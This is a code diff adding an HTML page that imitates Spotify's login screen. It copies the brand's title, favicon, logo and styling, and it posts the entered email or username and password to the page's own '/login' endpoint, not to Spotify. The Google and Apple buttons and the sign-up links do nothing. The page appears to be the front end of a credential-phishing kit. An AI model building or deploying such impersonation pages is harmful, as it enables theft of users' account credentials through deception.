@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Log in - Spotify</title>
+<link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon32.b64ecc03.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+@keyframes gradientShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+@keyframes soundWave{0%,100%{height:8px}50%{height:24px}}
+body{font-family:'Circular',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#121212,#1a1a2e,#16213e,#121212);background-size:300% 300%;animation:gradientShift 8s ease infinite;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.sound-bars{display:flex;gap:4px;align-items:flex-end;height:30px;margin-bottom:24px}
+.sound-bars .bar{width:4px;background:#1db954;border-radius:2px;animation:soundWave 1s ease-in-out infinite}
+.sound-bars .bar:nth-child(1){animation-delay:0s}
+.sound-bars .bar:nth-child(2){animation-delay:0.15s}
+.sound-bars .bar:nth-child(3){animation-delay:0.3s}
+.sound-bars .bar:nth-child(4){animation-delay:0.45s}
+.sound-bars .bar:nth-child(5){animation-delay:0.6s}
+.logo{margin-bottom:24px;animation:fadeInUp 0.5s ease}
+.logo svg{width:160px;height:48px;fill:#1db954}
+.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;animation:fadeInUp 0.7s cubic-bezier(0.16,1,0.3,1) 0.2s both}
+h1{font-size:28px;font-weight:700;color:#fff;text-align:center;margin-bottom:28px}
+.input-group{margin-bottom:20px;animation:fadeInUp 0.5s ease 0.3s both}
+.input-group label{display:block;font-size:14px;font-weight:700;color:#fff;margin-bottom:8px}
+.input-group input{width:100%;padding:14px 16px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:6px;color:#fff;font-size:16px;outline:none;transition:all 0.3s}
+.input-group input::placeholder{color:rgba(255,255,255,0.4)}
+.input-group input:focus{border-color:#1db954;box-shadow:0 0 0 3px rgba(29,185,84,0.2);background:rgba(255,255,255,0.15)}
+.login-btn{width:100%;padding:16px;background:linear-gradient(135deg,#1db954,#1ed760);color:#000;border:none;border-radius:500px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s;animation:fadeInUp 0.5s ease 0.4s both;letter-spacing:0.5px}
+.login-btn:hover{transform:scale(1.03);box-shadow:0 6px 20px rgba(29,185,84,0.4)}
+.divider{display:flex;align-items:center;margin:24px 0;animation:fadeIn 0.5s ease 0.5s both}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,0.15)}
+.divider span{padding:0 16px;color:rgba(255,255,255,0.5);font-size:13px}
+.btn-social{width:100%;padding:12px;background:transparent;border:1px solid rgba(255,255,255,0.3);border-radius:500px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px;animation:fadeInUp 0.5s ease 0.6s both}
+.btn-social:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.5)}
+.forgot{display:block;text-align:center;color:#b3b3b3;font-size:14px;text-decoration:none;margin-top:20px;animation:fadeIn 0.5s ease 0.7s both}
+.forgot:hover{color:#fff;text-decoration:underline}
+.signup{text-align:center;margin-top:32px;color:#b3b3b3;font-size:16px;animation:fadeIn 0.5s ease 0.8s both}
+.signup a{color:#1db954;font-weight:700;text-decoration:none}
+.signup a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<div class="sound-bars"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
+<div class="logo">
+    <svg viewBox="0 0 1134 340"><path d="M8 171c0 92 76 168 168 168s168-76 168-168S268 4 176 4 8 79 8 171zm230 78c-39-24-89-30-147-17-14 3-22-8-19-19 3-14 17-19 30-22 66-15 124-8 171 22 11 8 8 25-5 30-11 5-22 2-30-6v12zm17-53c-47-28-118-36-173-20-17 5-28-8-25-22 5-17 19-25 36-30 66-20 148-11 206 25 14 8 11 28-3 36-14 8-28 3-41-5v16zm18-56c-58-34-152-37-208-20-19 6-30-11-25-28 6-19 22-28 42-33 69-22 177-17 247 25 17 11 11 36-6 44-17 11-33 6-50-4v16z" fill="#1db954"/></svg>
+</div>
+<div class="card">
+    <h1>Log in to Spotify</h1>
+    <form action="/login" method="POST">
+        <div class="input-group">
+            <label>Email or username</label>
+            <input type="text" name="email" placeholder="Email or username" required>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" name="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="login-btn">LOG IN</button>
+    </form>
+    <div class="divider"><span>or</span></div>
+    <button class="btn-social">🔵 Continue with Google</button>
+    <button class="btn-social">🍎 Continue with Apple</button>
+    <a href="#" class="forgot">Forgot your password?</a>
+</div>
+<p class="signup">Don't have an account? <a href="#">Sign up for Spotify</a>.</p>
+</body>
+</html>
